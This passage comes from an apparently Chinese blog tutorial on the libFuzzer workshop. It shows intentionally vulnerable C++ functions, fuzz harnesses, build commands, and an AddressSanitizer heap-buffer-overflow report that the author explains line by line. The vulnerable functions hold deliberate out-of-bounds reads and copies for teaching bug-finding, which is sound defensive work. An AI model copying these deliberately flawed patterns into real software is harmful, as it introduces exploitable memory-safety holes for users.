class="line">    result = data[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">1</span>] == <span class="string">&#x27;U&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">2</span>] == <span class="string">&#x27;Z&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">3</span>] == <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">template&lt;class T&gt;</span><br><span class="line">typename T::value_type <span class="title function_">DummyHash</span><span class="params">(<span class="type">const</span> T&amp; buffer)</span> &#123;</span><br><span class="line">  typename T::value_type hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> value : buffer)</span><br><span class="line">    hash ^= value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">constexpr <span class="keyword">auto</span> kMagicHeader = <span class="string">&quot;ZN_2016&quot;</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxPacketLen = <span class="number">1024</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxBodyLength = <span class="number">1024</span> - <span class="keyword">sizeof</span>(kMagicHeader);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction2</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="type">bool</span> verify_hash)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="keyword">sizeof</span>(kMagicHeader))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">header</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), <span class="keyword">sizeof</span>(kMagicHeader))</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="type">uint8_t</span>, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kMagicHeader, header.c_str()))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; kMaxPacketLen)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!verify_hash)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy(data, data + size, body.data());</span><br><span class="line">  <span class="keyword">auto</span> real_hash = DummyHash(body);</span><br><span class="line">  <span class="keyword">return</span> real_hash == target_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kZn2016VerifyHashFlag = <span class="number">0x0001000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction3</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="built_in">std</span>::<span class="type">size_t</span> flags)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  <span class="keyword">return</span> VulnerableFunction2(data, size, verify_hash);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span></span><br></pre></td></tr></table></figure><p>首先看VulnerableFunction1()，有两个参数data&#x2F;size，当size&gt;3时会产生数组越界。接下来编写测试接口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//first_fuzzer.cc</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  VulnerableFunction1(data, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，直接将Libfuzzer生成的测试样例给到VulnerableFunction1就好。<br>接下来编译：<br><code>clang++ -g -std=c++11 -fsanitize=fuzzer,address first_fuzzer.cc ../../libFuzzer/Fuzzer/libFuzzer.a -o first_fuzzer</code><br>生成可执行程序first_fuzzer。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir corpus1</span><br><span class="line">./first_fuzz corpus1</span><br></pre></td></tr></table></figure><p>corpus1是我们提供的语料库。理想情况下，该语料库应该为被测代码提供各种有效和无效的输入，模糊器基于当前语料库中的样本输入生成随机突变。如果突变触发了测试代码中先前未覆盖的路径的执行，则该突变将保存到语料库中以供将来变更。当然LibFuzzer也可以没有任何初始种子的情况下工作（因为上面提到他是evolutionary型的fuzzer），但如果受测试的库接受复杂的结构化输入，则会因为随机产生的样例不易符合导致效率降低。<br>另外，如果我们有太多的样例并希望能够精简一下，则可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir corpus1_min</span><br><span class="line">./first_fuzzer -merge=1 corpus1_min corpus1</span><br></pre></td></tr></table></figure><p>这样，corpus1_min将会存放精简后的输入样例。</p><p>运行后得到crash，很快啊！！！</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">04</span> git:(master) ✗ ./first_fuzzer corpus1 </span><br><span class="line">INFO: Seed: <span class="number">2222548757</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">35</span> inline <span class="number">8</span>-bit counters): <span class="number">35</span> [<span class="number">0x7f7120</span>, <span class="number">0x7f7143</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">35</span> PCs): <span class="number">35</span> [<span class="number">0x5b7a68</span>,<span class="number">0x5b7c98</span>), </span><br><span class="line">INFO:        <span class="number">0</span> files found in corpus1</span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">3</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">3</span>NEW    cov: <span class="number">4</span> ft: <span class="number">4</span> corp: <span class="number">2</span>/<span class="number">4</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">1</span> CMP- DE: <span class="string">&quot;\x00\x00&quot;</span>-</span><br><span class="line">#<span class="number">1190</span>NEW    cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">7</span>b lim: <span class="number">14</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">2</span> ChangeBinInt-CMP- DE: <span class="string">&quot;F\x00&quot;</span>-</span><br><span class="line">#<span class="number">12191</span>NEW    cov: <span class="number">6</span> ft: <span class="number">6</span> corp: <span class="number">4</span>/<span class="number">11</span>b lim: <span class="number">122</span> exec/s: <span class="number">0</span> rss: <span class="number">28</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> InsertByte-</span><br><span class="line">#<span class="number">12297</span>REDUCE cov: <span class="number">6</span> ft: <span class="number">6</span> corp: <span class="number">4</span>/<span class="number">10</span>b lim: <span class="number">122</span> exec/s: <span class="number">0</span> rss: <span class="number">28</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">17213</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">40</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">30</span>/<span class="number">30</span> MS: <span class="number">1</span> InsertRepeatedBytes-</span><br><span class="line">#<span class="number">17274</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">27</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">17</span>/<span class="number">17</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">17356</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">24</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">14</span>/<span class="number">14</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">17437</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">18</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">8</span>/<span class="number">8</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">17458</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">14</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">9875</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x60200005a1d3</span> at pc <span class="number">0x00000059b461</span> bp <span class="number">0x7ffd79c84880</span> sp <span class="number">0x7ffd79c84878</span></span><br><span class="line">READ of size <span class="number">1</span> at <span class="number">0x60200005a1d3</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x59b460</span> in VulnerableFunction1(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">22</span>:<span class="number">14</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59bde4</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/first_fuzzer.cc:<span class="number">10</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x466186</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x46e80f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x456b99</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x41f522</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x7fbfaac5abf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">9</span> <span class="number">0x41f599</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/first_fuzzer+<span class="number">0x41f599</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x60200005a1d3</span> is located <span class="number">0</span> bytes to the right of <span class="number">3</span>-<span class="type">byte</span> region [<span class="number">0x60200005a1d0</span>,<span class="number">0x60200005a1d3</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x597b58</span> in operator <span class="built_in">new</span>[](unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_new_delete.cpp:<span class="number">102</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x466092</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">541</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46e80f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x456b99</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x41f522</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x7fbfaac5abf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">22</span>:<span class="number">14</span> in VulnerableFunction1(unsigned char <span class="keyword">const</span>*, unsigned long)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c04800033e0</span>: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd</span><br><span class="line">  <span class="number">0x0c04800033f0</span>: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd</span><br><span class="line">  <span class="number">0x0c0480003400</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  <span class="number">0x0c0480003410</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  <span class="number">0x0c0480003420</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">=&gt;<span class="number">0x0c0480003430</span>: fa fa fd fa fa fa fd fa fa fa[<span class="number">03</span>]fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003440</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003450</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003460</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003470</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003480</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">9875</span>==ABORTING</span><br><span class="line">MS: <span class="number">1</span> EraseBytes-; base unit: aea2e3923af219a8956f626558ef32f30a914ebc</span><br><span class="line"><span class="number">0x46</span>,<span class="number">0x55</span>,<span class="number">0x5a</span>,</span><br><span class="line">FUZ</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash<span class="number">-0</span>eb8e4ed029b774d80f2b66408203801cb982a60</span><br><span class="line">Base64: RlVa</span><br></pre></td></tr></table></figure><p>需要注意的地方有点多:<br>前面的几行输出fuzzer相关的选项和配置信息。seed&#x3D;2222548757是生成的随机数种子，可以利用<code>./first_fuzzer -seed=2222548757</code>指定随机种子。-max_len为测试输入的最大长度</p><p>以#开头的表示在fuzz的过程中覆盖的路径信息。<br><code>INITED</code> fuzzer已完成初始化，其中包括通过被测代码运行每个初始输入样本。<br><code>READ</code> fuzzer已从语料库目录中读取了所有提供的输入样本。<br><code>NEW</code> fuzzer创建了一个测试输入，该输入涵盖了被测代码的新区域。此输入将保存到主要语料库目录。<br><code>pulse</code> fuzzer已生成 2的n次方个输入（定期生成以使用户确信fuzzer仍在工作）。<br><code>REDUCE</code> fuzzer发现了一个更好（更小）的输入，可以触发先前发现的特征（设置-reduce_inputs&#x3D;0以禁用）。<br><code>cov</code> 执行当前语料库所覆盖的代码块或边的总数。<br><code>ft</code> libFuzzer使用不同的信号来评估代码覆盖率：边缘覆盖率，边缘计数器，值配置文件，间接调用方&#x2F;被调用方对等。这些组合的信号称为功能（ft：）。<br><code>corp</code> 当前内存中测试语料库中的条目数及其大小（以字节为单位）。<br><code>exec/s</code> 每秒模糊器迭代的次数。<br><code>rss</code> 当前的内存消耗。<br><code>L</code> 新输入的大小（以字节为单位）。<br><code>MS：&lt;n&gt; &lt;操作&gt;</code> 计数和用于生成输入的变异操作列表</p><p><code>#17458REDUCE cov: 7 ft: 7 corp: 5/14b lim: 170 exec/s: 0 rss: 29Mb L: 4/4 MS: 1 EraseBytes-</code><br>指尝试了17458个输入，成功发现了5个样本（放入语料库）大小为14b，共覆盖了7个代码块，占用内存29mb，变异操作为EraseBytes-。</p><p>接下来就是异常检测相关的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">==9875==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005a1d3 at pc 0x00000059b461 bp 0x7ffd79c84880 sp 0x7ffd79c84878</span><br><span class="line">READ of size 1 at 0x60200005a1d3 thread T0</span><br></pre></td></tr></table></figure><p>可以看到AddressSanitizer检测到其中的一个输入触发了堆溢出（heap-buffer-overflow）的漏洞。<br>更据错误信息中的<code> #0 0x59b460 in VulnerableFunction1(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14</code>可以看到错误点在<code>vulnerable_functions.h:22:14</code>，对应<code>             data[3] == &#39;Z&#39;;</code>即数组越界的位置。下面的SUMMARY也与之对应。</p><p>倒数第二行给出了造成crash的输入，并将其写入了crash-0eb8e4ed029b774d80f2b66408203801cb982a60。<br>复现crash可执行<code>./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</code>。</p><p>这样fuzz tesing基本上已经完成了，我们得到了一个造成程序crash的输入，并得知存在堆溢出的漏洞。这样我们就可以有针对性的对程序进行动态调试，利用造成crash的输入回溯出漏洞的细节。</p><p>继续fuzz函数VulnerableFunction2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">constexpr <span class="keyword">auto</span> kMagicHeader = <span class="string">&quot;ZN_2016&quot;</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxPacketLen = <span class="number">1024</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxBodyLength = <span class="number">1024</span> - <span class="keyword">sizeof</span>(kMagicHeader);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction2</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="type">bool</span> verify_hash)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="keyword">sizeof</span>(kMagicHeader))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">header</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), <span class="keyword">sizeof</span>(kMagicHeader))</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="type">uint8_t</span>, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kMagicHeader, header.c_str()))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; kMaxPacketLen)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!verify_hash)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy(data, data + size, body.data());</span><br><span class="line">  <span class="keyword">auto</span> real_hash = DummyHash(body);</span><br><span class="line">  <span class="keyword">return</span> real_hash == target_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数多了一个bool参数，因此我们的的接口函数要有所改动：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash_flags[] = &#123;<span class="literal">true</span>, <span class="literal">false</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> flag : verify_hash_flags)</span><br><span class="line">VulnerableFunction2(data, size, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了提高fuzz出crash的概率，我们要分别fuzz flag为true和false的请况，而不应该把flag写死。<br>接着编译并执行得到：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 